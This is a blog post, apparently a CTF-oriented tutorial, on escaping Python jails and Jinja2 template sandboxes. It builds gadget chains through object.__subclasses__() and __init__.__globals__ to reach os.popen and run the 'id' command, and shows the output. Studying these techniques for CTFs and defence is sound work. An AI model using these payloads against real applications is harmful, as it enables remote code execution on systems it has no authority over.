---
title: "Gadgeting in Python Jails"
tags:
- Python
- Sandbox Escape
date: 2021-12-09T09:52:29+05:30
draft: false
---

We've all been there. That one CTF that wants to test your object oriented skills by confining you to a python jail.
Additionally some might even keep `builtins` and `eval` out of reach.

[Here](https://www.youtube.com/watch?v=SN6EVIG4c-0) is a cool video explanation by @pwnfunction on server side template
injection wherein he mentions a way to "gadget" our way out of Flask's Jinja2 backend to get remote code execution.
Kudos to him for sharing this technique.

For those of you reluctant to watch a 10 minute video (although I'd highly recommend watching it), here's the gist of it:

```python
''.__class__
.__base__
.__subclasses__()[141]
.__init__
.__globals__['sys']
.modules['os']
.popen('id')
.read()
```

First, we get the class of the string, that is, the `str` class.
In python's object oriented world, every object inherits from the base class called `object`.
Here, we access that using the `__base__` magic (dunder) attribute.
Next, we list out all the subclasses of `object`, in other words, all the classes that inherit from this base class.
Choosing the `141`th element of the list `warnings.catch_warnings` (we'll come back to this later),
we list out its globals during initialization using
the `__init__.__globals__` attribute. Then we can get a handle to the builtin `sys` module, which uses the `os` modules
itself. After accessing the `os` module, we can invoke its methods. Here `id` the command being executed on the system.

Let's try it out.

```
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: 'wrapper_descriptor' object has no attribute '__globals__'
```

*What!? Does it not work?*


I noticed a similar behavior in CTFs that had python jails. It turns out that the index of the `warnings.catch_warnings`
class varies from one version to the other in python. A better idea would be if we dynamically picked the class from
the `''.__class__.__base__.__subclasses__()` list instead of hardcoding the index as `141`.

We can modify the gadget like so:

```python
next(
  filter(
    lambda x: 'catch_warnings' == x.__name__,
    ''.__class__.__base__.__subclasses__()
  )
).__init__
.__globals__['sys']
.modules['os']
.popen('id').read()
```
which results in the following:
```
uid=1000(h) gid=1000(h) groups=1000(h),970(docker),998(wheel)
```

This solves the problem but what do we do when the jail restricts access to `warnings.catch_warnings`?

Expanding upon the aforementioned idea, we can look for other subclasses which make use of `sys`
by running the following:
```python
names = list()
for x in ''.__class__.__base__.__subclasses__():
	if hasattr(x.__init__, '__globals__')
	and x.__init__.__globals__.get('sys'):
		names.append(x.__name__)

from pprint import pprint
pprint(names)
```

```python
['_ModuleLock',
 '_DummyModuleLock',
 '_ModuleLockManager',
 'ModuleSpec',
 'FileLoader',
 '_NamespacePath',
 '_NamespaceLoader',
 'FileFinder',
 'zipimporter',
 '_ZipImportResourceReader',
 'IncrementalEncoder',
 'IncrementalDecoder',
 'StreamReaderWriter',
 'StreamRecoder',
 '_wrap_close',
 'Quitter',
 '_Printer',
 'WarningMessage',
 'catch_warnings',
 '_GeneratorContextManagerBase',
 '_BaseExitStack']
```

Now that we have potential subclasses to latch onto, we can weaponize this.

The initial plan was to look for any of the above subclasses in the list, get a handle to one
of them, thereby executing the system commands.

```python
next(
  filter(
    lambda x: x.__name__ in [
			'_ModuleLock', '_DummyModuleLock',
 			'_ModuleLockManager', 'ModuleSpec',
 			'FileLoader', '_NamespacePath',
 			'_NamespaceLoader', 'FileFinder',
 			'zipimporter', '_ZipImportResourceReader',
 			'IncrementalEncoder', 'IncrementalDecoder',
 			'StreamReaderWriter', 'StreamRecoder',
 			'_wrap_close','Quitter',
 			'_Printer', 'WarningMessage',
 			'catch_warnings',
			'_GeneratorContextManagerBase',
 			'_BaseExitStack'],
    ''.__class__.__base__.__subclasses__()
  )
).__init__
.__globals__['sys']
.modules['os']
.popen('id').read()
```

However, it would be better if we did not hardcode the values.

```python
next(
	filter(
		lambda x:
			hasattr(
				x.__init__,
				'__globals__'
			)
			and x.__init__
			.__globals__
			.get('sys'),
			''.__class__
			.__base__
			.__subclasses__()
	)
).__init__
.__globals__['sys']
.modules['os']
.popen('id').read()
```

There you have it! This payload will work as long as there is at least one subclass in the subclasses list
which makes use of `sys`. With that, our object oriented quest has come to an end.

Thanks for giving this a read!
